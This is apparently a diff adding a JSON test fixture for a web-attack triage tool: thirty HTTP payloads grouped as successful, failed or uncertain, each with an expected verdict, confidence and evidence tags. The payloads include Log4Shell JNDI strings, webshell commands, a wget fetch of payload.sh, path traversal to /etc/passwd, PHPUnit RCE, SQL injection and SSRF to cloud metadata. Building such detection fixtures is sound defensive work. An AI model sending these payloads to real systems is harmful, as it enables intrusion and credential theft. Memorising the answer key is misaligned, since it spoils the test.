@@ -1,0 +1,38 @@
+{
+  "successful": [
+    {"id": "success-001", "input_type": "payload", "payload": "GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["endpoint_command", "payload_delivery"]},
+    {"id": "success-002", "input_type": "payload", "payload": "POST /shell.php HTTP/1.1 Host: victim cmd=whoami", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["webshell_upload", "command_execution"]},
+    {"id": "success-003", "input_type": "payload", "payload": "GET /api?cmd=wget http://203.0.113.10/payload.sh HTTP/1.1", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["download_command", "endpoint_process"]},
+    {"id": "success-004", "input_type": "payload", "payload": "POST /actuator/gateway/routes/x HTTP/1.1 Host: spring", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["spring_gateway_rce", "successful_response"]},
+    {"id": "success-005", "input_type": "payload", "payload": "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["path_traversal", "command_execution"]},
+    {"id": "success-006", "input_type": "payload", "payload": "GET /console/images/%252e%252e%252fconsole.portal HTTP/1.1", "expected_verdict": "Likely successful exploitation", "expected_confidence": "medium", "evidence": ["successful_response", "known_exploit_path"]},
+    {"id": "success-007", "input_type": "payload", "payload": "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 <?php system('id');?>", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["phpunit_rce", "command_execution"]},
+    {"id": "success-008", "input_type": "payload", "payload": "GET /owa/auth/x.js?cmd=powershell%20-c%20iwr HTTP/1.1", "expected_verdict": "Likely successful exploitation", "expected_confidence": "high", "evidence": ["powershell", "endpoint_process"]},
+    {"id": "success-009", "input_type": "payload", "payload": "POST /cgi-bin/luci/;stok=/locale HTTP/1.1 command=cat /etc/passwd", "expected_verdict": "Likely successful exploitation", "expected_confidence": "medium", "evidence": ["router_rce", "sensitive_file_read"]},
+    {"id": "success-010", "input_type": "payload", "payload": "GET /beacon?id=host01 HTTP/1.1 Host: c2.example", "expected_verdict": "Possible compromise with C2 indicators", "expected_confidence": "medium", "evidence": ["http_beacon", "periodic_c2"]}
+  ],
+  "failed": [
+    {"id": "failed-001", "input_type": "payload", "payload": "GET /shell?cmd=whoami HTTP/1.1 Host: victim", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["http_404"]},
+    {"id": "failed-002", "input_type": "payload", "payload": "GET /missing?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["encoded_marker", "http_404"]},
+    {"id": "failed-003", "input_type": "payload", "payload": "GET /../../../../etc/passwd HTTP/1.1 Host: victim", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["path_traversal", "http_403"]},
+    {"id": "failed-004", "input_type": "payload", "payload": "POST /login HTTP/1.1 user=admin' OR '1'='1--", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["sqli_marker", "auth_failed"]},
+    {"id": "failed-005", "input_type": "payload", "payload": "GET /phpinfo.php?cmd=id HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["command_marker", "http_404"]},
+    {"id": "failed-006", "input_type": "payload", "payload": "GET /wp-content/plugins/x/upload.php HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["upload_probe", "http_404"]},
+    {"id": "failed-007", "input_type": "payload", "payload": "GET /HNAP1/ HTTP/1.1 SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings/`cd /tmp`", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["router_probe", "http_401"]},
+    {"id": "failed-008", "input_type": "payload", "payload": "POST /xmlrpc.php HTTP/1.1 <methodName>system.multicall</methodName>", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["bruteforce_probe", "rate_limited"]},
+    {"id": "failed-009", "input_type": "payload", "payload": "GET /manager/html HTTP/1.1 Authorization: Basic Zm9vOmJhcg==", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "low", "evidence": ["default_credential_probe", "http_401"]},
+    {"id": "failed-010", "input_type": "payload", "payload": "GET /index.html HTTP/1.1 Host: victim", "expected_verdict": "Insufficient evidence", "expected_confidence": "low", "evidence": ["normal_200"]}
+  ],
+  "uncertain": [
+    {"id": "uncertain-001", "input_type": "payload", "payload": "GET /api/search?q=${jndi:ldap://example/a} HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "medium", "evidence": ["single_marker", "no_response"]},
+    {"id": "uncertain-002", "input_type": "payload", "payload": "GET /download?file=../../etc/passwd HTTP/1.1", "expected_verdict": "Reconnaissance or probing", "expected_confidence": "medium", "evidence": ["path_probe", "missing_status"]},
+    {"id": "uncertain-003", "input_type": "payload", "payload": "GET /api?next=http://169.254.169.254/latest/meta-data/ HTTP/1.1", "expected_verdict": "Reconnaissance or probing", "expected_confidence": "medium", "evidence": ["ssrf_probe", "no_callback"]},
+    {"id": "uncertain-004", "input_type": "payload", "payload": "POST /upload HTTP/1.1 filename=shell.jsp", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "medium", "evidence": ["upload_marker", "no_execution"]},
+    {"id": "uncertain-005", "input_type": "payload", "payload": "GET /debug?cmd=whoami HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "medium", "evidence": ["command_marker", "unknown_status"]},
+    {"id": "uncertain-006", "input_type": "payload", "payload": "GET /cgi-bin/admin.cgi?Command=;id HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "medium", "evidence": ["command_injection_marker"]},
+    {"id": "uncertain-007", "input_type": "payload", "payload": "GET /solr/admin/cores?action=CREATE&name=x HTTP/1.1", "expected_verdict": "Reconnaissance or probing", "expected_confidence": "medium", "evidence": ["admin_api_probe"]},
+    {"id": "uncertain-008", "input_type": "payload", "payload": "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1", "expected_verdict": "Possible exploitation attempt", "expected_confidence": "medium", "evidence": ["traversal_marker", "no_endpoint"]},
+    {"id": "uncertain-009", "input_type": "payload", "payload": "POST /graphql HTTP/1.1 query={__schema{types{name}}}", "expected_verdict": "Reconnaissance or probing", "expected_confidence": "medium", "evidence": ["graphql_introspection"]},
+    {"id": "uncertain-010", "input_type": "payload", "payload": "GET /beacon?id=test HTTP/1.1 Host: unknown", "expected_verdict": "Possible compromise with C2 indicators", "expected_confidence": "medium", "evidence": ["single_beacon_pattern", "insufficient_periodicity"]}
+  ]
+}
